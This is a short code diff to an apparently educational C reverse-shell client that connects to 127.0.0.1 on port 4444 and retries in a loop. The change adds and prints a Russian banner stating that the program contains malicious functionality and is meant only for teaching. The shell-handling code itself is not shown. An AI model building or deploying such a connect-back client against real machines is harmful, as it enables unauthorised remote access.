@@ -14,6 +14,7 @@
 
 #define ADDRESS "127.0.0.1"
 #define PORT 4444
+#define BANNER "Внимание! Данное ПО содержит вредоносный функционал и предназначен он исключительно в учебных целях!!!"
 
 
 void handle_socket() {
@@ -57,6 +58,7 @@ int try_connect() {
 
 
 int main(int argc, char** argv) {
+    puts(BANNER);
     int s;
     while (1) {
         if ((s = try_connect()) == -1) sleep(1);
